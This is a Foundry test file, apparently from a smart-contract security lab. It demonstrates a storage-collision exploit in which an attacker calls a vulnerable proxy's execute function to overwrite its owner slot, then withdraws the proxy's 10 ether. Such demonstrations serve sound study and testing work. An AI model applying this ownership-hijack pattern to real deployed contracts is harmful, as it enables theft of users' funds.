// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {VulnerableLogic} from "../src/VulnerableLogic.sol";
import {VulnerableProxy} from "../src/VulnerableProxy.sol";

contract StorageCollisionTest is Test {

    VulnerableLogic logic;
    VulnerableProxy proxy;

    address attacker = address(0x1234);

    function setUp() public {
        logic = new VulnerableLogic();
        proxy = new VulnerableProxy();
        vm.deal(address(proxy), 10 ether);
    }

    function testStorageCollision() public {

        assertEq(proxy.number(), 0);
        assertEq(proxy.owner(), address(this));
        assertEq(address(proxy).balance, 10 ether);

        bytes32 beforeSlot = vm.load(
            address(proxy),
            bytes32(uint256(0))
        );

        console2.log("Before exploit:");
        console2.logBytes32(beforeSlot);
        console2.log("Proxy owner before:", proxy.owner());
        uint256 beforeBalance = address(proxy).balance;

        vm.prank(attacker);
        proxy.execute(uint256(uint160(attacker)), address(logic));
        assertEq(proxy.owner(), attacker);

        bytes32 afterSlot = vm.load(
            address(proxy),
            bytes32(uint256(0))
        );

        console2.log("After exploit:");
        console2.logBytes32(afterSlot);
        console2.log("Proxy owner after:", proxy.owner());

        vm.prank(attacker);
        proxy.withdraw();
        console2.log("Proxy beforeBalance:", beforeBalance);
        console2.log("Proxy newBalance:", address(proxy).balance);
        assertEq(address(proxy).balance, 0);
        assertEq(attacker.balance, 10 ether);
    }
}